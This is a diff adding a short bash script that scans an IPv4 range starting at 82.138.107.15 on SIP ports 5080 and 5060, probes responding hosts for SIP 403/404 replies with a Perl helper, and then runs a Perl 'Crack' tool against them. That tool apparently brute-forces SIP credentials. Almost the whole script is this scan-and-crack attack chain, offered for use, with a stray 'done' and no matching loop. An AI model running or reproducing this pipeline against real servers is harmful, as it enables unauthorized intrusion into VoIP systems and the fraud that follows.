@@ -1,0 +1,39 @@
+#!/bin/bash
+
+# Scan IPv4 range on ports
+echo -e "\nStart scanning ...\n"
+
+./ss 5080 -b 82.138.107.15 -s 10
+sed '/:[0-9]*$/ ! s/$/:5080/' bios.txt >>5080.txt
+rm bios.txt # remove the bios file
+./ss 5060 -b 82.138.107.15 -s 10
+sed '/:[0-9]*$/ ! s/$/:5060/' bios.txt >>5060.txt
+rm bios.txt # remove the bios file
+cat 5080.txt 5060.txt >> IPSx
+grep -Po "(\d+\.){3}\d+:?(\d?){6}" IPSx >>IPS
+rm 5080.txt # remove the file
+rm 5060.txt # remove the file
+rm IPSx # remove the file
+
+echo -e "\nEnding scanning port !\n"
+
+# SIP Responses
+
+echo -e "\nStart SIP Responses ...\n"
+
+perl run IPS
+cat 403.pal 404.pal >> ipSIP
+rm IPS # remove the file IPS
+
+echo -e "\nEnding Responses !\n"
+
+# SIP Crack
+
+echo -e "\nStart SIP Crack ...\n"
+
+perl Crack 250 2 ipSIP
+rm ipSIP # remove the file ipSIP
+rm *.pal # remove the file
+
+done
+exit 0
